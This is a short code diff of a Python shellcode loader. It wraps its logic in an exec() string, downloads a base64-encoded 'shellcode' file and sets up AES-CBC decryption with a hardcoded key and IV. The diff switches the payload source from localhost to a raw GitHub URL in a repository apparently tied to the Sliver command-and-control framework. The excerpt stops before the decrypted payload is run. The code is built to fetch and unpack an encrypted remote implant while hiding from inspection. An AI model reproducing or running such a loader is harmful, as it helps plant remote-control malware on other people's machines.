@@ -5,7 +5,7 @@ import requests
 def main():
     exec("""
 def run_code():
-    r = requests.get('http://localhost:8000/shellcode.b64')
+    r = requests.get('https://raw.githubusercontent.com/abaum65/sliver_py/main/shellcode.b64')
     code = r.content
     data = base64.b64decode(code)
     cipher = AES.new(b'O1AEKFXfpDkCIbvqM9dcgoR0Up1VXAyX', AES.MODE_CBC, b'Uhtbdtzep2onibHT')
